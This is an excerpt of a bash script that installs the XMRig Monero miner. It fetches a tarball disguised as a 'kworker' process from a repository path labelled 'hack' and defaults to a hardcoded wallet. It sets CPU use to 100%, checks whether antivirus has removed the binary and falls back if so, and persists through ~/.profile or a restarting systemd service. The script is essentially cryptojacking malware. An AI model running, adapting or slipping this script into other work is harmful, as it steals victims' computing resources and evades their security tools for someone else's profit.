...
if [ -z $WALLET ]; then
  WALLET=`84YikQQa894Grw3Kcsb3GbDaKsY2CciqUC4xeBCPQWqggncrQUNBtV4dZDwdQAcfrTZ32GijR8Ws7EuuAC5bhJG7FdTHFfy`
  # echo "Script usage:"
  # echo "> setup_xmrig_miner.sh <wallet address> [<your email address>]"
...
echo "If needed, miner in foreground can be started by $HOME/xmrig/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://code.pingbook.top site)"
fi
echo
...
if ! sudo -n true 2>/dev/null; then
  ...
  echo "Mining in background will be performed using xmrig_miner systemd service."
fi
...
echo "[*] Downloading xmrig advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/alterhu2020/xmrig_setup/master/linux/hack/kworker-c46f8fbd5de64ddb84d4bfa865823d.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/alterhu2020/xmrig_setup/master/linux/hack/kworker-c46f8fbd5de64ddb84d4bfa865823d.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/xmrig"
[ -d $HOME/xmrig ] || mkdir $HOME/xmrig
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/xmrig; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/xmrig directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/xmrig/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/xmrig/config.json
$HOME/xmrig/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/xmrig/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/xmrig/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/xmrig/xmrig was removed by antivirus (or some other problem)"
  fi
  ...
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/xmrig --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/xmrig directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/xmrig/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/xmrig/config.json
  $HOME/xmrig/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/xmrig/xmrig ]; then
      echo "ERROR: Stock version of $HOME/xmrig/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/xmrig/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/xmrig/xmrig is OK"
...
sed -i 's/"url": *"[^"]*",/"url": "stratum+tcp://xmr.f2pool.com:13531",/' $HOME/xmrig/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/xmrig/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/xmrig/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/xmrig/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/xmrig/xmrig.log'",#' $HOME/xmrig/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/xmrig/config.json
...
echo "[*] Creating $HOME/xmrig/miner.sh script"
...
if ! sudo -n true 2>/dev/null; then
  if ! grep xmrig/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/xmrig/miner.sh script to $HOME/.profile"
    echo "$HOME/xmrig/miner.sh --config=$HOME/xmrig/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/xmrig/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/xmrig/xmrig.log file)"
  /bin/bash $HOME/xmrig/miner.sh --config=$HOME/xmrig/config_background.json >/dev/null 2>&1
else
...
[Service]
ExecStart=$HOME/xmrig/xmrig --config=$HOME/xmrig/config.json
Restart=always
Nice=10
CPUWeight=1
...
EOL
    ...
    echo "[*] Starting xmrig_miner systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable xmrig_miner.service
    sudo systemctl start xmrig_miner.service
    echo "To see miner service logs run \"sudo journalctl -u xmrig_miner -f\" command"
  fi
fi
...
if [ "$CPU_THREADS" -lt "4" ]; then
  ...
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/xmrig/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/xmrig/config_background.json"
fi
echo ""
